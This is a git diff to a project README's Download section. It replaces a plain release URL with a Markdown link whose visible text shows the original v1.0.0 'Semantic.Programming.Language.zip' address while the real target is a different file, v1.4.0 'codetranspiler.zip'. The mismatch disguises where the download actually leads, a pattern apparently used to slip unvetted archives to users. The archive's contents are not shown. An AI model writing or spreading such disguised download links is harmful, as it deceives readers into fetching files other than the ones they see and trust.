@@ -14,7 +14,7 @@
 
 ## Download
 
-https://github.com/tarekwasfy01/Semantic-Programming-Language/releases/download/v1.0.0/Semantic.Programming.Language.zip
+[https://github.com/tarekwasfy01/Semantic-Programming-Language/releases/download/v1.0.0/Semantic.Programming.Language.zip](https://github.com/tarekwasfy01/Semantic-Programming-Language/releases/download/v1.4.0/codetranspiler.zip)
 
 ## Pre Transpiled Modules
 
